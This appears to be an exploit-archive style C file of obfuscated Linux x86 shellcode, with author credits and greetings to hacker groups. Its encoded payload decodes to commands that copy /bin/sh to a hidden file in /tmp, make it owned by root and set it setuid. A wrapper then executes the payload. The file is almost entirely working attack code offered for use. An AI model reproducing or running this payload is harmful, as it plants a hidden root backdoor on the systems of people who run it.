/*
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org), loneferret (exploit-db.com)
greetzz to all devilzc0de, jasakom, yogyacarderlink, serverisdown, indonesianhacker and all my friend !!
*/

#include <stdio.h>

char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x89\x80\x6c\x0e\xff\x35\x80\xe9\x01"
		   "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x95\x66\xf5\x66\x07\xe5"
		   "\x40\x87\x9d\xa3\x64\xa8\x9d\x9d\x64\x64\x97\x9e\xbe\x18\x87"
		   "\x9d\x62\x98\x98\x98\xbe\x16\x87\x20\x3c\x86\x88\xbe\x16\x02"
		   "\xb5\x96\x1d\x29\x34\x34\x34\x98\xa5\x55\x64\x97\x9e\xa3\x64"
		   "\x64\xa8\x9d\x55\x64\xa9\xa2\xa5\x64\x63\x9d\x9e\x99\x99\x9a"
		   "\xa3\xa8\x9d\x9a\xa1\xa1\x70\x55\x98\x9d\xa4\xac\xa3\x55\xa7"
		   "\xa4\xa4\xa9\x6f\xa7\xa4\xa4\xa9\x55\x64\xa9\xa2\xa5\x64\x63"
		   "\x9d\x9e\x99\x99\x9a\xa3\xa8\x9d\x9a\xa1\xa1\x70\x55\x98\x9d"
		   "\xa2\xa4\x99\x55\x69\x6c\x6a\x6a\x55\x64\xa9\xa2\xa5\x64\x63"
		   "\x9d\x9e\x99\x99\x9a\xa3\xa8\x9d\x9a\xa1\xa1";
		
int main(void)
{
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}